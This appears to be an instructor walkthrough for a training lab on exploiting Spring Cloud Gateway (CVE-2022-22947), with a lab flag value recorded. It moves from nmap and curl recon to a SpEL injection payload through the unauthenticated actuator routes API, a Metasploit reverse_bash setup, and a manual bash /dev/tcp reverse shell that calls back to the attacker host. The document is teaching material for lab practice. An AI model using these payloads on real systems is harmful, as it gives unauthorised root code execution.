---
id: B02.M10-walkthrough
title: Houston — Instructor Walkthrough
artifact_type: activity_walkthrough
audience: instructor
block: B02
module_type: lab
legacy_aliases:
- legacy/week2/labs/pcte_vulnhub_targets/walkthroughs/02-target2-spring-cloud-gateway.md
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: instructor_only
references:
- path: ./answer-key.md
---

# Houston — Instructor Walkthrough

## Objective and starting context

Live instructor demo for the Houston Module (`B02.M10`). Students know only the assigned subnet `192.168.11.0/24`. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.11.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T2_FLAG`. Confirm the live `.env` value before grading.


## Required Tools
* `iproute2` (for adding static routes when your host has no path to the target subnet)
* `nmap` (for host discovery, port scanning, and `http-enum`)
* `curl` (for web enumeration, actuator interaction, and exploit delivery)
* `python3` (pretty-print actuator JSON)
* `nc` (Netcat, for catching the reverse shell)
* `metasploit-framework` (section 4 automated path via `exploit/linux/http/spring_cloud_gateway_rce`)

## 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.11.0/24`. We are positioned on the external lab network (`192.168.100.0/24`).

If your host does not already have a route into that Class C, add one via the lab router (address and path vary by deployment):

```bash
sudo ip route add 192.168.11.0/24 via 192.168.100.254
```

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need live hosts before we care about services.

```bash
nmap -sn 192.168.11.0/24
```

*Output excerpt:*
```text
Nmap scan report for 192.168.11.10
Host is up (0.000016s latency).
Nmap scan report for 192.168.11.11
Host is up (0.000018s latency).
```

**Observation:** Two live hosts respond on this subnet: **192.168.11.10** and **192.168.11.11**.

**Inference:** Neither address is obviously “the” target yet (this is not a single `.10` plus router/gateway). Enumerate **both** before committing.

## 2. Service Enumeration

We have two candidate IPs. Next question: **what is listening on each, and what does it claim to be?** That takes a version scan, not another ping sweep.

```bash
nmap -Pn -sV -p- 192.168.11.10 192.168.11.11
```

*Why these options:*

* `-Pn` — skip nmap’s host-discovery probes. We already know both addresses responded to `-sn`. This also keeps the scan going if a host later ignores ping but still serves TCP.
* `-sV` — version detection. An open port labeled only `http` is not enough; we need the product string (here, **nginx 1.13.2** on both).
* `-p-` — all 65535 TCP ports, not nmap’s default top 1000. **8080** on `.10` would be easy to miss on a top-ports-only scan (default top 1000 includes 80, not always 8080).
* Two IPs on one command — same scan twice; one table instead of two copy-paste runs.

*Output excerpt:*
```text
Nmap scan report for 192.168.11.10
PORT     STATE SERVICE VERSION
8080/tcp open  http    nginx 1.13.2

Nmap scan report for 192.168.11.11
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.13.2
```

**Observation:** Both hosts appear to speak HTTP via **nginx 1.13.2**, but on different ports (`8080` vs `80`).

**Inference:** Either both are independent nginx servers, or one is proxying to the other and the version scan is seeing the upstream banner. Fetch both roots before committing to an exploit path.

### Initial Web Probing — Both Hosts Look the Same

nmap told us HTTP on **80** and **8080**. Confirm that with a normal GET — headers and body. This is ordinary recon `curl`, not an exploit.

```bash
curl -s -D - http://192.168.11.11/ -o /tmp/t2-11-root.html | head -12
curl -s -D - http://192.168.11.10:8080/ -o /tmp/t2-10-root.html | head -12
```

*Why this `curl`:*

* `-s` — silent; drop the progress meter.
* `-D -` — write response **headers** to stdout (`Server`, `ETag`, status).
* `-o /tmp/t2-…-root.html` — write the **body** to a file so headers and HTML stay separated.
* `| head -12` — only the first header lines.
* Use **`:8080`** on `.10` because that is the listener nmap found (not 80). `.11` is on 80, so no port in the URL.

You can also open both URLs in a browser; the visible page is the same.

*Header excerpt (both hosts — matching `ETag` and `Server: nginx/1.13.2`):*
```text
HTTP/1.1 200 OK
Server: nginx/1.13.2
Content-Type: text/html
ETag: "6a455f1a-3bf"
```

*Body excerpt (both hosts):*
```html
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Example Domain</title>
```

**Observation:** A normal browser-style `GET /` returns the same "Example Domain" HTML from **192.168.11.11:80** and **192.168.11.10:8080**, including the same `ETag`.

**Inference:** The two boxes are not independent sites with unrelated content. Port 8080 is likely serving (or proxying) the same origin as port 80. A `GET` request alone is not enough to pick the exploitation target.

### Failed Attempt: Trusting `GET /` to Separate the Hosts

Because both roots return the same page, it is tempting to treat **192.168.11.11** as the only real web server and ignore **192.168.11.10**.

*What we learned:* Identical `GET` bodies can hide a second HTTP stack sitting in front of a static upstream. We need probes that exercise each host's own request handling, not just the proxied page content.

### Differentiating the Hosts — `HEAD` Shows a Second HTTP Stack

Use `HEAD` against the root. Unlike `GET`, this does not retrieve the page body and exposes how each server handles the request internally:

```bash
curl -s -I http://192.168.11.11/
curl -s -I http://192.168.11.10:8080/
```

*Why `-I`:* `curl -I` sends **HEAD** and prints response headers only (`-s` still drops the progress meter). We already have the HTML; we want whether each stack answers HEAD the same way it answers GET.

*Output for 192.168.11.11:*
```text
HTTP/1.1 200 OK
Server: nginx/1.13.2
Content-Type: text/html
```

*Output for 192.168.11.10:*
```text
HTTP/1.1 404 Not Found
Content-Type: application/json
```

**Observation:** `HEAD /` succeeds on the nginx host but returns a JSON `404` from port 8080. Port 8080 is therefore doing something different from a plain static file server — but `application/json` alone could be Node, Go, Python, or Java. We do not yet know the framework.

**Inference:** Port 8080 has its own HTTP/API layer behind the proxied `GET` responses. Next, try to retrieve that layer's error body and find paths it handles itself.

### Failed Attempt: `GET` on an Unmapped Path

A natural follow-up is to request a path that should not exist and read the error body:

```bash
curl -s http://192.168.11.10:8080/doesnotexist | head -5
curl -s http://192.168.11.11/doesnotexist | head -5
```

*Output excerpt (both hosts):*
```html
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
```

**Observation:** Ordinary `GET` requests to unmapped paths still return nginx HTML on **both** hosts.

*What we learned:* Many `GET` requests on port 8080 are still being forwarded to the upstream nginx origin, so this probe does not surface the JSON-speaking backend. We need a request that the front-end stack answers itself.

### Surfacing the Backend Error Body — Non-`GET` Requests

`HEAD /` already told us the backend prefers JSON for some requests. Send a non-`GET` method to a path that is unlikely to be proxied:

```bash
curl -s -X PUT http://192.168.11.10:8080/internal-probe
curl -s -X PUT http://192.168.11.11/internal-probe | head -5
```

*Why `-X PUT`:* `-X` sets the HTTP method. nginx on `.11` typically allows GET/HEAD for static files and returns **405** for PUT. A gateway/API layer often answers unknown methods itself instead of forwarding them. `internal-probe` is an arbitrary path we do not expect to exist.

*Output for 192.168.11.10:*
```json
{
    "timestamp": "2026-07-09T18:10:31.085+00:00",
    "path": "/internal-probe",
    "status": 404,
    "error": "Not Found",
    "message": null,
    "requestId": "e638a87a-12"
}
```

*Output excerpt for 192.168.11.11:*
```html
<html>
<head><title>405 Not Allowed</title></head>
<body bgcolor="white">
<center><h1>405 Not Allowed</h1></center>
```

**Observation:** Only port 8080 returns a structured JSON error with `timestamp`, `path`, `status`, `error`, and `requestId` fields. **192.168.11.11** still answers with nginx HTML.

**Inference:** Port 8080 is running its own application layer behind the proxied `GET` responses, but we still do not know the framework. The next step is to enumerate paths on **192.168.11.10:8080** and see what management or API surfaces are exposed.

### Enumerating Paths on Port 8080

Run a generic HTTP path enumeration script against the interesting host:

```bash
nmap -Pn -p 8080 --script http-enum 192.168.11.10
```

*Why this nmap:*

* `-Pn` — same as before; skip host discovery.
* `-p 8080` — only the listener we care about (this is path brute-force, not another full-port scan).
* `--script http-enum` — NSE script that probes a list of common HTTP paths (admin, actuator, manager, and so on) and reports hits. It is ordinary directory recon, not an exploit.

*Output excerpt:*
```text
| http-enum:
|   /actuator/: Spring Boot Actuator endpoint
```

**Observation:** The scanner reports a **Spring Boot Actuator** endpoint at `/actuator`. That is the first concrete framework clue — port 8080 is not just a reverse proxy; it is a Spring Boot application with a management API.

**Inference:** Follow the `/actuator` lead on **192.168.11.10** and enumerate what that management surface exposes. Confirm whether **192.168.11.11** also has it.

### Investigating Spring Boot Actuator

The scanner named **Spring Boot Actuator** at `/actuator`. A student who has not seen that stack before can look it up with what was just discovered:

*Search:* `spring boot actuator /actuator`

That leads to the official docs ([Actuator Endpoints](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)): Spring Boot commonly exposes operational and health endpoints under `/actuator`. Confirm the path manually and inspect the response headers:

```bash
curl -s -D - -o /dev/null http://192.168.11.10:8080/actuator | head -10
curl -s -o /dev/null -w '192.168.11.11 /actuator -> HTTP %{http_code}\n' \
  http://192.168.11.11/actuator
```

*Why the second `curl`:* `-o /dev/null` discards the body; `-w '…%{http_code}\n'` prints only the status so we can see `.11` is **404** without dumping HTML.

*Output:*
```text
HTTP/1.1 200 OK
Content-Type: application/vnd.spring-boot.actuator.v3+json
Content-Length: 2008

192.168.11.11 /actuator -> HTTP 404
```

**Observation:** Actuator responds only on **192.168.11.10**, with the Spring Boot actuator v3 media type. The earlier JSON error fields (`timestamp`, `path`, `status`, `error`, `requestId`) also match Spring Boot's default error JSON — searchable as `spring boot json error timestamp path status requestId` ([Error Responses](https://docs.spring.io/spring-boot/reference/web/servlet.html#web.servlet.spring-mvc.error-handling)). **192.168.11.11** has no actuator surface and can be treated as the static nginx upstream.

List the exposed actuator links. The full JSON is long (~100+ pretty-printed lines), so show the top of the document and then search for unusual endpoints:

```bash
curl -s http://192.168.11.10:8080/actuator | python3 -m json.tool | head -n 40
curl -s http://192.168.11.10:8080/actuator | python3 -m json.tool | grep -n -A2 '"gateway"'
```

*Why pretty-print then grep:*

* `python3 -m json.tool` — indent the actuator `_links` object so each key sits on its own line. Compact JSON is one long line and is hard to scan by eye.
* `grep -n -A2 '"gateway"'` — look for a link named **`gateway`** (quoted so we match the JSON key, not a random substring). `-n` prints the line number; `-A2` is two lines after the match so the `href` is visible. We grep for `gateway` because Spring Cloud Gateway’s actuator API is a known extra link on `/actuator`; `health` / `info` are expected on any Boot app.

*Head excerpt:*
```json
{
    "_links": {
        "self": {
            "href": "http://192.168.11.10:8080/actuator",
            "templated": false
        },
        "beans": {
            "href": "http://192.168.11.10:8080/actuator/beans",
            "templated": false
        },
        "health": {
            "href": "http://192.168.11.10:8080/actuator/health",
            "templated": false
        },
        "info": {
            "href": "http://192.168.11.10:8080/actuator/info",
            "templated": false
        },
        ...
```

*Grep excerpt:*
```text
91:        "gateway": {
92-            "href": "http://192.168.11.10:8080/actuator/gateway",
93-            "templated": false
```

**Observation:** Alongside common endpoints such as `health` and `info`, there is a **`gateway`** link.

**Inference:** Searching with the newly observed path — `spring boot actuator /actuator/gateway` — points to **Spring Cloud Gateway** and its management API ([Spring Cloud Gateway Actuator API](https://docs.spring.io/spring-cloud-gateway/reference/spring-cloud-gateway-server-webflux/actuator-api.html)). That product identity also explains the earlier behavior: an API gateway on **192.168.11.10:8080** proxying many `GET` requests to the nginx origin on **192.168.11.11**.

Verify health and whether route management is readable without authentication:

```bash
curl -s http://192.168.11.10:8080/actuator/health | python3 -m json.tool
curl -s -o /dev/null -w 'GET /actuator/gateway/routes -> HTTP %{http_code}\n' \
  http://192.168.11.10:8080/actuator/gateway/routes
```

*Output:*
```json
{
    "status": "UP"
}
```
```text
GET /actuator/gateway/routes -> HTTP 200
```

**Observation:** The gateway is healthy, and `/actuator/gateway/routes` is readable without credentials.

**Target selection:** **192.168.11.10** is the application tier to attack — Spring Cloud Gateway with an exposed gateway actuator. **192.168.11.11** is the static nginx upstream and can be set aside.

## 3. Vulnerability Discovery

Focus on **192.168.11.10**. We now know:

* The product is **Spring Cloud Gateway**
* The **gateway actuator** is exposed over HTTP
* Route definitions are **readable** without authentication

Spring Cloud Gateway's actuator API can also create, delete, and refresh routes when left unrestricted ([Actuator API](https://docs.spring.io/spring-cloud-gateway/reference/spring-cloud-gateway-server-webflux/actuator-api.html)). With the product and exposed gateway actuator known, a vulnerability search such as `Spring Cloud Gateway actuator RCE` or `Spring Cloud Gateway SpEL injection` surfaces public advisories describing **SpEL injection through route filters** when the gateway actuator is enabled and unsecured ([CVE-2022-22947](https://tanzu.vmware.com/security/cve-2022-22947)).

**What the bug is:** Gateway routes can include filters such as `AddResponseHeader`. Filter arguments are not only static strings. In vulnerable versions, a value written as a Spring Expression Language fragment (`#{ ... }`) is **evaluated on the server** when the gateway reloads routes. SpEL can construct Java types (`T(java.lang.Runtime)`), call `getRuntime().exec(...)`, and capture stdout. The actuator `POST /actuator/gateway/routes/{id}` endpoint is how an unauthenticated client **writes** that filter. `POST /actuator/gateway/refresh` is how the gateway **loads** it. After refresh, `GET` of the same route shows the evaluated result in the stored filter definition.

That is the research result. Next we **prove** this host evaluates SpEL that way, using a public detection payload — not a reverse shell yet.

**Candidate selection:** Before trying other Spring Boot issues (for example, generic actuator info leaks), test the gateway-specific path first — we already have an unauthenticated `/actuator/gateway` surface, which is exactly the precondition called out in the advisory.

### Detection probe (public SpEL `id`)

The matching Vulhub environment (`vulnhub/spring/CVE-2022-22947/README.md`) demonstrates safe detection by posting a route whose `AddResponseHeader` filter embeds a SpEL expression that runs `id` and stores the output in the route definition:

```text
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(
  T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()
))}
```

What each piece is doing:

* `#{ ... }` — Spring Expression Language. The gateway treats this as code, not a header literal.
* `T(fully.qualified.Class)` — SpEL **type operator**: resolve that Java class so we can call static/instance methods on it.
* `T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})` — start an OS process. The `String[]` form is one argument per token (`id` only here).
* `getInputStream()` — the process **stdout**.
* `T(org.springframework.util.StreamUtils).copyToByteArray(...)` — Spring helper: read that stream into a `byte[]`.
* `new String(...)` — turn those bytes into a Java `String` so the filter can store it as the `Result` header value.

After a gateway refresh, that string becomes visible when the route is retrieved.

Create the malicious test route (`-X POST` writes a new route; `-H` sets JSON; `-d` is the body; `-w` prints the status so `201` is obvious):

```bash
curl -s -w '\nHTTP %{http_code}\n' -X POST \
  http://192.168.11.10:8080/actuator/gateway/routes/hacktest \
  -H 'Content-Type: application/json' \
  -d '{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}'
```

*Output:*
```text
HTTP 201
```

**Observation:** Route creation succeeded without authentication (`201 Created`). That confirms the actuator is not read-only.

### Failed Attempt: Retrieving the Route Before Refreshing

Immediately fetch the new route:

```bash
curl -s -w '\nHTTP %{http_code} len=%{size_download}\n' \
  http://192.168.11.10:8080/actuator/gateway/routes/hacktest
```

*Output:*
```text
HTTP 404 len=0
```

*What we learned:* The route is not active (and SpEL is not evaluated) until the gateway reloads its routing configuration. The Vulhub PoC's next step is an explicit refresh.

Refresh the gateway to trigger SpEL evaluation:

```bash
curl -s -X POST http://192.168.11.10:8080/actuator/gateway/refresh
```

Retrieve the route definition and inspect the filter output:

```bash
curl -s http://192.168.11.10:8080/actuator/gateway/routes/hacktest | python3 -m json.tool
```

*Output:*
```json
{
    "predicate": "RouteDefinitionRouteLocator$$Lambda$1172/656417780",
    "route_id": "hacktest",
    "filters": [
        "[[AddResponseHeader Result = 'uid=0(root) gid=0(root) groups=0(root)\n'], order = 1]"
    ],
    "uri": "http://example.com:80",
    "order": 0
}
```

**Observation:** The `filters` field contains `uid=0(root) ...` — the server executed `id` as root and embedded the output in the route definition.

That confirms **CVE-2022-22947**. Section 4 uses Metasploit against the same actuator. Section 5 is a reverse shell without Metasploit.

Clean up the test route before proceeding:

```bash
curl -s -X DELETE http://192.168.11.10:8080/actuator/gateway/routes/hacktest
curl -s -X POST http://192.168.11.10:8080/actuator/gateway/refresh
```

## 4. Automated Path: Metasploit

Product + confirmed SpEL `id` is enough to look for an existing exploit. In `msfconsole`:

```text
msf6 > search spring_cloud_gateway

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/http/spring_cloud_gateway_rce  2022-01-26       excellent  Yes    Spring Cloud Gateway Remote Code Execution
```

(The same module is also findable with `search cve:2022-22947`.) Use it with a **bash reverse shell** payload — the module default (`cmd/unix/python/meterpreter/reverse_tcp`) assumes Python on the target, which this container does not provide.

```bash
msfconsole -q
```

```text
msf6 > use exploit/linux/http/spring_cloud_gateway_rce
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set RHOSTS 192.168.11.10
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set RPORT 8080
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set LHOST 192.168.100.1
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set LPORT 4444
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set TARGET 0
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set PAYLOAD cmd/unix/reverse_bash
msf6 exploit(linux/http/spring_cloud_gateway_rce) > run
```

*Why these options:* `RHOSTS` / `RPORT` are the gateway we enumerated (`.10:8080`, not the nginx upstream). `LHOST` is your lab-facing IP. `TARGET 0` is Unix in-memory. `PAYLOAD cmd/unix/reverse_bash` matches a Java container that has bash but not Python.

*Output excerpt:*
```text
[*] Started reverse TCP handler on 192.168.100.1:4444
[+] The target is vulnerable.
[*] Command shell session 1 opened (192.168.100.1:4444 -> 192.168.11.10:xxxxx)
```

In the session:

```bash
id
cat /flag.txt
```

*Output:*
```text
uid=0(root) gid=0(root) groups=0(root)
cobalt-viper
```

That is a complete automated path to the flag. Section 5 is the same SpEL route injection without Metasploit.

## 5. Manual Path: SpEL reverse shell

With command execution confirmed via the `id` probe, escalate to an interactive reverse shell. Reuse the same actuator route-injection technique, but call `Runtime.exec()` with a reverse-shell command instead of capturing `id` into a response header.

Start a Netcat listener on your attacker machine (use your IP on the lab-facing LAN; example below uses `192.168.100.1`):

```bash
nc -lvnp 4444
```

Prepare the callback address and reverse-shell command:

```bash
LHOST="192.168.100.1"   # Change to your attacker IP
LPORT="4444"
REVCMD="bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
```

### Failed Attempt: String-Based `Runtime.exec()`

A common mistake is passing the entire reverse shell as a single string:

```text
T(java.lang.Runtime).getRuntime().exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.100.1/4444 0>&1'")
```

That often fails to open a shell.

*What we learned:* Java's `Runtime.exec(String)` tokenizes on spaces and breaks the bash `-c` argument. Use the `String[]` form (`exec(new String[]{"/bin/bash", "-c", "..."})`) so the shell command is passed intact. The successful `id` probe already used the array form.

The reverse-shell SpEL expression is:

```text
#{T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","<REVCMD>"})}
```

We do not need `StreamUtils` here: we are not reading stdout back into a header. The process is a callback to Netcat.

Inject the malicious route and refresh:

```bash
curl -s -X POST http://192.168.11.10:8080/actuator/gateway/routes/revshell \
  -H 'Content-Type: application/json' \
  -d "{
  \"id\": \"revshell\",
  \"filters\": [{
    \"name\": \"AddResponseHeader\",
    \"args\": {
      \"name\": \"Result\",
      \"value\": \"#{T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"/bin/bash\\\",\\\"-c\\\",\\\"$REVCMD\\\"})}\"
    }
  }],
  \"uri\": \"http://example.com\"
}"

curl -s -X POST http://192.168.11.10:8080/actuator/gateway/refresh
```

Check the Netcat listener. You should receive a root shell:

```text
listening on [any] 4444 ...
connect to [192.168.100.1] from (UNKNOWN) [192.168.11.10] 48596
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@1bbf368c441d:/#
```

This is **remote code execution** as root through Spring Cloud Gateway SpEL injection.

From the reverse shell (or the Metasploit session in section 4):

```bash
cat /flag.txt
```

*Output:*
```text
cobalt-viper
```

After gaining access, remove the malicious route:

```bash
curl -s -X DELETE http://192.168.11.10:8080/actuator/gateway/routes/revshell
curl -s -X POST http://192.168.11.10:8080/actuator/gateway/refresh
```

Target 2 is complete.
